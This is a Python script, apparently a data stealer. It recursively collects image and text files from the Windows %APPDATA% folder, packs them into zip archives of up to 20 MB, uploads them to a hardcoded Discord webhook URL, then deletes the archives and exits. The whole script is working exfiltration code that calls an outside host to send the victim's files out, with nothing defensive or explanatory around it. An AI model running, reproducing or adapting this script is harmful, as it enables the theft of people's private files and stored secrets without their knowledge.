import requests
import os
from pathlib import Path
import time
import ctypes
from ctypes import wintypes
import zipfile
import sys
import random

def get_appdata_folder():
    return os.getenv('APPDATA')  # Retrieves the path to the %APPDATA% folder on Windows

def send_message_to_discord(webhook_url, message):
    data = {"content": message}
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 200:
            print(f"Message successfully sent: {message}")
        else:
            print(f"Failed to send message: {message}: {response.text}")
    except requests.RequestException as e:
        print(f"Failed to send message due to network error: {str(e)}")

def create_zip_files(source_folder_path, target_folder_path):
    source_folder_path = Path(source_folder_path)
    target_folder_path = Path(target_folder_path)
    zip_files = []
    current_zip = None
    current_zip_size = 0
    max_zip_size = 20 * 1024 * 1024  # Maximum zip size is 20 MB
    allowed_extensions = {'.png', '.jpg', '.jpeg', '.webp', '.txt'}
    zip_counter = 1  # Start the naming from zip_1

    for root, dirs, files in os.walk(source_folder_path):
        for file in files:
            file_path = Path(root) / file
            if file_path.suffix.lower() not in allowed_extensions:
                continue

            file_size = os.path.getsize(file_path)
            if file_size > max_zip_size:
                print(f"{file_path} is skipped because it is larger than 20 MB.")
                continue

            if current_zip is None or current_zip_size + file_size > max_zip_size:
                if current_zip is not None:
                    current_zip.close()
                    zip_files.append(current_zip.filename)
                random_number = random.randint(100000, 999999)  # Generate a six-digit random number
                zip_filename = target_folder_path / f"zip_{zip_counter}_{random_number}.zip"
                current_zip = zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED)
                current_zip_size = 0
                zip_counter += 1

            current_zip.write(file_path, arcname=file_path.relative_to(source_folder_path))
            current_zip_size += file_size

    if current_zip is not None:
        current_zip.close()
        zip_files.append(current_zip.filename)

    return zip_files

def send_all_files_in_folder(webhook_url, source_folder_path, target_folder_path):
    print(f"Source folder path: {source_folder_path}")

    send_message_to_discord(webhook_url, "Archiving all files...")
    zip_files = create_zip_files(source_folder_path, target_folder_path)

    for zip_file in zip_files:
        if os.path.exists(zip_file):
            send_message_to_discord(webhook_url, f"Uploading: {zip_file}")
            with open(zip_file, 'rb') as file:
                file_data = file.read()
                files = {'file': (os.path.basename(zip_file), file_data, 'application/zip')}
                try:
                    response = requests.post(webhook_url, files=files)
                    if response.status_code == 200:
                        print(f"{zip_file} successfully uploaded.")
                    else:
                        print(f"Failed to upload {zip_file}: {response.text}")
                except requests.RequestException as e:
                    print(f"Failed to upload {zip_file} due to network error: {str(e)}")
            os.remove(zip_file)
            print(f"{zip_file} deleted.")
        else:
            print(f"Error: File does not exist {zip_file}")

    sys.exit()

webhook_url = 'https://discord.com/api/webhooks/1246739190582874172/YYmnEVV2-TOyueAgi-5KEocJuSFPWNheva7WKHyaaA2cxIISX_htohAsZY4-sIPYpDY0'
source_folder_path = get_appdata_folder()  # Set this to your source folder if different
target_folder_path = get_appdata_folder()
send_all_files_in_folder(webhook_url, source_folder_path, target_folder_path)
